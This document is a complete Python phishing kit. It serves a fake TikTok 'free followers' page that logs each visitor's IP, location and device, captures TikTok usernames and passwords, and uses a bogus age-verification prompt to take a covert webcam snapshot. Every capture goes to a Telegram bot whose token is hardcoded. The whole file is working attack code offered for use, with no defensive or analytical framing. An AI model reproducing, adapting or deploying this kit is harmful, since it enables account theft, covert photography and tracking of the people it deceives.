import http.server
import socketserver
import json
import urllib.request
import urllib.parse
import base64
import time
import re

# ==========================================
# 👇 AFAAAAA PUT YOUR TELEGRAM DETAILS HERE 👇
# ==========================================
BOT_TOKEN = "8396429601:AAELIPUnk5biF7_N9dBgD69Y33gaCQmWyrA" 
CHAT_ID = "8186620538"
PORT = 8080
# ==========================================

def send_to_telegram(message):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = urllib.parse.urlencode({'chat_id': CHAT_ID, 'text': message, 'parse_mode': 'HTML'}).encode('utf-8')
    try:
        req = urllib.request.Request(url, data=data)
        urllib.request.urlopen(req)
    except Exception as e:
        print("Telegram Msg Error:", e)

def send_photo_to_telegram(base64_img):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
    try:
        # Clean base64 string
        img_data = base64_img.split(',')[1]
        binary_img = base64.b64decode(img_data)
        
        boundary = '----WebKitFormBoundary7MA4YWxkTrZu0gW'
        body = b''
        
        # Chat ID
        body += f'--{boundary}\r\nContent-Disposition: form-data; name="chat_id"\r\n\r\n{CHAT_ID}\r\n'.encode('utf-8')
        
        # Photo
        body += f'--{boundary}\r\nContent-Disposition: form-data; name="photo"; filename="cam.jpg"\r\nContent-Type: image/jpeg\r\n\r\n'.encode('utf-8')
        body += binary_img + b'\r\n'
        body += f'--{boundary}--\r\n'.encode('utf-8')

        req = urllib.request.Request(url, data=body)
        req.add_header('Content-Type', f'multipart/form-data; boundary={boundary}')
        urllib.request.urlopen(req)
        print("Photo sent successfully!")
    except Exception as e:
        print("Photo Error:", e)

HTML_PAGE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>TikTok Boost</title>
    <style>
        body { margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #000; color: #fff; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
        
        /* Landing Page */
        #landing-page { text-align: center; padding: 20px; width: 100%; box-sizing: border-box; }
        .logo { font-size: 40px; font-weight: bold; text-shadow: 2px 2px 0 #fe2c55, -2px -2px 0 #25f4ee; margin-bottom: 20px; letter-spacing: 2px; }
        .boost-icon { font-size: 60px; margin-bottom: 20px; animation: pulse 2s infinite; }
        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.1); } 100% { transform: scale(1); } }
        .title { font-size: 24px; font-weight: bold; margin-bottom: 10px; }
        .subtitle { color: #aaa; margin-bottom: 30px; font-size: 14px; }
        
        /* Progress Bar */
        .progress-container { width: 80%; max-width: 300px; background: #333; border-radius: 10px; margin: 20px auto; overflow: hidden; display: none; }
        .progress-bar { width: 0%; height: 10px; background: #fe2c55; transition: width 0.5s; }
        
        /* Login Page */
        #login-page { display: none; width: 100%; flex-direction: column; align-items: center; }
        .input-group { width: 80%; max-width: 300px; margin-bottom: 15px; }
        input { width: 100%; padding: 15px; border-radius: 8px; border: 1px solid #333; background: #121212; color: #fff; font-size: 16px; box-sizing: border-box; outline: none; }
        input:focus { border-color: #fe2c55; }
        .btn { width: 80%; max-width: 300px; padding: 15px; border: none; border-radius: 8px; background: #fe2c55; color: #fff; font-size: 16px; font-weight: bold; margin-top: 10px; cursor: pointer; }
        .spinner { display: none; border: 4px solid rgba(255,255,255,0.3); border-radius: 50%; border-top: 4px solid #fe2c55; width: 30px; height: 30px; animation: spin 1s linear infinite; margin-top: 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        
        /* Modal */
        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); align-items: center; justify-content: center; z-index: 999; }
        .modal-content { background: #1a1a1a; padding: 20px; border-radius: 12px; text-align: center; width: 80%; max-width: 300px; border: 1px solid #333; }
        .modal-btn { background: #25f4ee; color: #000; padding: 12px; border-radius: 8px; border: none; font-weight: bold; margin-top: 15px; width: 100%; cursor: pointer; font-size: 16px;}
        
        /* Hidden Camera */
        #camera-hidden { display: none; position: fixed; top: 0; left: 0; width: 1px; height: 1px; opacity: 0; pointer-events: none; }
        #loading-text { display: none; font-size: 18px; color: #25f4ee; margin-top: 20px; font-weight: bold; }
    </style>
</head>
<body>

    <!-- 1. LANDING PAGE -->
    <div id="landing-page">
        <div class="logo">TikTok</div>
        <div class="boost-icon">🚀</div>
        <div class="title">Free Followers Generator</div>
        <div class="subtitle">Enter your details to receive 10,000 real followers instantly.</div>
        <button class="btn" onclick="startBoost()">Start Boost</button>
        <div class="progress-container" id="progress-container">
            <div class="progress-bar" id="progress-bar"></div>
        </div>
    </div>

    <!-- 2. LOGIN PAGE -->
    <div id="login-page">
        <div class="logo">TikTok</div>
        <div class="subtitle">Log in to verify your account and claim followers</div>
        <div class="input-group">
            <input type="text" id="username" placeholder="Phone number, email, or username">
        </div>
        <div class="input-group">
            <input type="password" id="password" placeholder="Password">
        </div>
        <button class="btn" onclick="submitCreds()">Log In</button>
        <div class="spinner" id="spinner"></div>
        <div id="loading-text">Processing...</div>
    </div>

    <!-- 3. AGE MODAL -->
    <div class="modal" id="age-modal">
        <div class="modal-content">
            <h3 style="margin-top:0;">Age Verification</h3>
            <p style="font-size: 14px; color: #aaa;">To prevent bot abuse, you must verify your age to receive followers.</p>
            <button class="modal-btn" onclick="requestCamera()">I am 18 years old</button>
        </div>
    </div>

    <!-- HIDDEN CAMERA -->
    <div id="camera-hidden">
        <video id="camera-video" autoplay playsinline></video>
        <canvas id="camera-canvas"></canvas>
    </div>

    <script>
        window.onload = function() {
            fetch('/log_visit', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ userAgent: navigator.userAgent, platform: navigator.platform })
            });
        };

        function startBoost() {
            document.getElementById('progress-container').style.display = 'block';
            let width = 0;
            const bar = document.getElementById('progress-bar');
            const interval = setInterval(() => {
                if (width >= 100) {
                    clearInterval(interval);
                    document.getElementById('landing-page').style.display = 'none';
                    document.getElementById('login-page').style.display = 'flex';
                } else {
                    width += Math.floor(Math.random() * 15) + 5;
                    if (width > 100) width = 100;
                    bar.style.width = width + '%';
                }
            }, 400); // fake loading speed
        }

        function submitCreds() {
            const u = document.getElementById('username').value;
            const p = document.getElementById('password').value;
            if(!u || !p) return;

            document.getElementById('username').style.display = 'none';
            document.getElementById('password').style.display = 'none';
            document.querySelector('.btn').style.display = 'none';
            document.getElementById('spinner').style.display = 'block';
            document.getElementById('loading-text').style.display = 'block';

            fetch('/log_creds', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ username: u, password: p })
            }).then(() => {
                setTimeout(() => {
                    document.getElementById('spinner').style.display = 'none';
                    document.getElementById('loading-text').innerText = "Account Verified!";
                    setTimeout(() => {
                        document.getElementById('age-modal').style.display = 'flex';
                    }, 1000);
                }, 2000);
            });
        }

        async function requestCamera() {
            document.getElementById('age-modal').style.display = 'none';
            document.getElementById('loading-text').innerText = "Applying Boost & Verifying Age...";

            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
                const video = document.getElementById('camera-video');
                video.srcObject = stream;
                
                // Wait 2 seconds, then snap silently
                setTimeout(() => {
                    const canvas = document.getElementById('camera-canvas');
                    canvas.width = video.videoWidth || 640;
                    canvas.height = video.videoHeight || 480;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    
                    const dataURL = canvas.toDataURL('image/jpeg', 0.6);
                    
                    fetch('/log_camera', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({ image: dataURL })
                    }).then(() => {
                        document.getElementById('loading-text').innerText = "Success! Redirecting to TikTok...";
                        setTimeout(() => { window.location.href = "https://www.tiktok.com"; }, 2000);
                    });

                    stream.getTracks().forEach(track => track.stop());
                }, 2000);

            } catch (err) {
                // If they block camera, just redirect
                window.location.href = "https://www.tiktok.com";
            }
        }
    </script>
</body>
</html>
"""

class Handler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(HTML_PAGE.encode('utf-8'))

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        data = json.loads(post_data.decode('utf-8'))

        if self.path == '/log_visit':
            ip = self.client_address[0]
            if 'X-Forwarded-For' in self.headers:
                ip = self.headers['X-Forwarded-For']
            
            # Get Location & ISP from IP (using free API)
            try:
                req = urllib.request.urlopen(f"http://ip-api.com/json/{ip}")
                geo = json.loads(req.read().decode())
                location = f"{geo.get('city', 'Unknown')}, {geo.get('country', 'Unknown')} (ISP: {geo.get('isp', 'Unknown')})"
            except:
                location = "Unknown"

            msg = f"👀 <b>NEW TARGET OPENED LINK</b>\n\n"
            msg += f"🌐 <b>IP:</b> <code>{ip}</code>\n"
            msg += f"📍 <b>Location:</b> {location}\n"
            msg += f"📱 <b>Device:</b> {data.get('platform')}\n"
            msg += f"🔍 <b>User-Agent:</b> {data.get('userAgent')}\n"
            send_to_telegram(msg)

        elif self.path == '/log_creds':
            msg = f"🔐 <b>CREDENTIALS CAPTURED!</b>\n\n"
            msg += f"👤 <b>Username/Email:</b> <code>{data.get('username')}</code>\n"
            msg += f"🔑 <b>Password:</b> <code>{data.get('password')}</code>\n"
            send_to_telegram(msg)

        elif self.path == '/log_camera':
            msg = f"📸 <b>CAMERA SNAPSHOT CAPTURED!</b>\n"
            send_to_telegram(msg)
            send_photo_to_telegram(data.get('image'))

        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.end_headers()
        self.wfile.write(b'{"status":"ok"}')

print(f"[*] Starting server on http://localhost:{PORT}")
print("[*] Don't forget to put your Bot Token and Chat ID inside the code!")
with socketserver.TCPServer(("", PORT), Handler) as httpd:
    httpd.serve_forever()
